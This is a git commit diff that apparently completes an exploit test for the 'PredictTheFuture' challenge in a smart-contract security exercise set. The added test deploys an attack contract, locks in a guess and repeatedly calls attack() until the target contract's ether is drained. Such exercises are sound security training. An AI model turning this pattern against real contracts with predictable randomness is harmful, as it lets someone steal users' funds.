8aacd7fddba5a2b4a49009558746d4458a2a6bcb
Harsh Singh <harshsingh16d@gmail.com>
2024-06-18 23:43:49 +0530

    predict the future done

--- module-6/test/08-PredictTheFuture.test.ts
+++ module-6/test/08-PredictTheFuture.test.ts
@@ -24,9 +24,23 @@ describe('PredictTheFutureChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const attackFactory = await ethers.getContractFactory("PredictTheFutureAttack");
+    const attackContract = await attackFactory.deploy(target.address);
+    await attackContract.deployed();
+
+    const lockInGuessTx = await attackContract.lockInGuess({ value: utils.parseEther("1") });
+    await lockInGuessTx.wait();
+
+    while (!(await target.isComplete())) {
+      try {
+        const attackTx = await attackContract.attack();
+        await attackTx.wait();
+      } catch (err) {
+        console.log(err);
+      }
+      const blockNumber = await provider.getBlockNumber();
+      console.log(`Tried block number: ${blockNumber}`);
+    }
 
     expect(await provider.getBalance(target.address)).to.equal(0);
     expect(await target.isComplete()).to.equal(true);
